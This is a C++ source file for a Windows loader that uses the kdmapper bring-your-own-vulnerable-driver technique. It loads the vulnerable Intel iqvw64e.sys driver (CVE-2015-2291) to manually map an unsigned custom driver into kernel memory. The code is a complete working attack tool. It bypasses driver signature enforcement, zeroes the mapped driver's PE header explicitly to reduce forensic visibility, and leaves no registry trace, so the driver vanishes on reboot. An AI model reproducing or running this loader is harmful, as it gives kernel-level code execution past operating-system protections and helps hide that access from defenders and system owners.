/*
 * loader.cpp  —  QCU Kernel Driver Loader
 *
 * Loads qcu_kdrv.sys into the kernel using kdmapper (BYOVD technique).
 * Must be run as Administrator.
 *
 * Usage:
 *   qcu_loader.exe <path_to_qcu_kdrv.sys>
 *
 * What this does:
 *   1. Drop + load iqvw64e.sys (Intel NIC driver, CVE-2015-2291)
 *      via intel_driver::Load()
 *   2. Read qcu_kdrv.sys into a memory buffer
 *   3. Manually map it into kernel pool via kdmapper::MapDriver()
 *      — this calls CustomDriverEntry() inside qcu_kdrv.sys
 *   4. Unload iqvw64e.sys (clean up the vulnerable driver)
 *
 * After this completes, \\.\QcuKdrv is accessible from user mode.
 * The driver has NO registry entry and disappears on reboot.
 */

#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>

/* ── kdmapper headers ─────────────────────────────────────────────── */
/* Add the kdmapper/kdmapper directory to your include path in VS:    */
/*   Project → Properties → VC++ Directories → Include Directories   */
#include <kdmapper.hpp>
#include <utils.hpp>
#include <intel_driver.hpp>

/* ── Crash handler ───────────────────────────────────────────────── */
LONG WINAPI QcuCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
    if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
        kdmLog(L"[QCU] CRASH at 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress
               << L"  code=0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode
               << std::endl);
    else
        kdmLog(L"[QCU] CRASH (unknown)" << std::endl);

    /* Always try to clean up the vulnerable driver on any crash */
    if (intel_driver::hDevice)
        intel_driver::Unload();

    return EXCEPTION_EXECUTE_HANDLER;
}

/* ── MapDriver callback ──────────────────────────────────────────── */
/*
 * Called by kdmapper just before it jumps to CustomDriverEntry.
 * param1 / param2 are passed as arguments to CustomDriverEntry.
 * We don't need custom params — CustomDriverEntry ignores RegistryPath anyway.
 */
static bool OnBeforeDriverEntry(ULONG64* param1, ULONG64* param2,
                                ULONG64 allocationPtr, ULONG64 allocationSize)
{
    UNREFERENCED_PARAMETER(param1);
    UNREFERENCED_PARAMETER(param2);
    kdmLog(L"[QCU] Driver mapped at kernel pool 0x" << std::hex << allocationPtr
           << L"  size=0x" << allocationSize << std::endl);
    return true;
}

/* ── Entry point ─────────────────────────────────────────────────── */
int wmain(int argc, wchar_t** argv)
{
    SetUnhandledExceptionFilter(QcuCrashHandler);

    /* ── Parse arguments ─────────────────────────────────────────── */
    if (argc < 2) {
        kdmLog(L"Usage: qcu_loader.exe <path_to_qcu_kdrv.sys>" << std::endl);
        return EXIT_FAILURE;
    }

    const std::wstring driver_path = argv[1];

    if (!std::filesystem::exists(driver_path)) {
        kdmLog(L"[QCU] File not found: " << driver_path << std::endl);
        return EXIT_FAILURE;
    }

    kdmLog(L"[QCU] Loading driver: " << driver_path << std::endl);

    /* ── Step 1: Load the Intel vulnerable driver (iqvw64e.sys) ──── */
    kdmLog(L"[QCU] Loading iqvw64e.sys..." << std::endl);
    if (!NT_SUCCESS(intel_driver::Load())) {
        kdmLog(L"[QCU] Failed to load vulnerable driver." << std::endl);
        kdmLog(L"      Make sure you are running as Administrator." << std::endl);
        kdmLog(L"      Also check if iqvw64e.sys is on the blocklist (Win11 23H2+)." << std::endl);
        return EXIT_FAILURE;
    }
    kdmLog(L"[QCU] iqvw64e.sys loaded." << std::endl);

    /* ── Step 2: Read qcu_kdrv.sys into memory ───────────────────── */
    std::vector<uint8_t> raw_image;
    if (!kdmUtils::ReadFileToMemory(driver_path, &raw_image)) {
        kdmLog(L"[QCU] Failed to read driver file." << std::endl);
        intel_driver::Unload();
        return EXIT_FAILURE;
    }
    kdmLog(L"[QCU] Driver image read: " << raw_image.size() << L" bytes" << std::endl);

    /* ── Step 3: Map the driver into kernel ──────────────────────── */
    /*
     * MapDriver args:
     *   data            — raw PE bytes
     *   param1          — passed as DriverObject to CustomDriverEntry  (0 = let kdmapper create a fake one)
     *   param2          — passed as RegistryPath to CustomDriverEntry  (0 = NULL, driver ignores it)
     *   free            — free the pool allocation after entry runs    (false: keep it; our driver stays resident)
     *   destroyHeader   — zero the PE header after mapping             (true: reduces forensic visibility)
     *   mode            — AllocatePool (normal kernel pool)
     *   PassAllocationAddressAsFirstParam — false (we pass 0/0 above)
     *   callback        — our OnBeforeDriverEntry
     *   exitCode        — NTSTATUS from CustomDriverEntry
     */
    NTSTATUS driver_status = STATUS_SUCCESS;
    kdmLog(L"[QCU] Mapping driver into kernel..." << std::endl);

    if (!kdmapper::MapDriver(
            raw_image.data(),
            0,                                          /* param1 (DriverObject) */
            0,                                          /* param2 (RegistryPath) */
            false,                                      /* free after entry      */
            true,                                       /* destroy PE header     */
            kdmapper::AllocationMode::AllocatePool,
            false,                                      /* PassAllocationPtr     */
            OnBeforeDriverEntry,
            &driver_status))
    {
        kdmLog(L"[QCU] kdmapper::MapDriver failed." << std::endl);
        intel_driver::Unload();
        return EXIT_FAILURE;
    }

    if (!NT_SUCCESS(driver_status)) {
        kdmLog(L"[QCU] CustomDriverEntry returned 0x" << std::hex << driver_status << std::endl);
        kdmLog(L"      Driver may have partially initialized. Check for BSOD." << std::endl);
        intel_driver::Unload();
        return EXIT_FAILURE;
    }

    kdmLog(L"[QCU] Driver mapped and initialized." << std::endl);

    /* ── Step 4: Unload the vulnerable driver ────────────────────── */
    if (!NT_SUCCESS(intel_driver::Unload())) {
        kdmLog(L"[QCU] Warning: failed to fully unload iqvw64e.sys." << std::endl);
        /* Non-fatal — qcu_kdrv.sys is already running */
    } else {
        kdmLog(L"[QCU] iqvw64e.sys unloaded." << std::endl);
    }

    /* ── Done ────────────────────────────────────────────────────── */
    kdmLog(L"[QCU] \\\\.\\QcuKdrv is now available." << std::endl);
    kdmLog(L"[QCU] Run your Python bridge: python -c \"from qcu.core.hardware_bridge import QcuKernelBridge; b=QcuKernelBridge(); print(b.query_status())\"" << std::endl);

    return EXIT_SUCCESS;
}
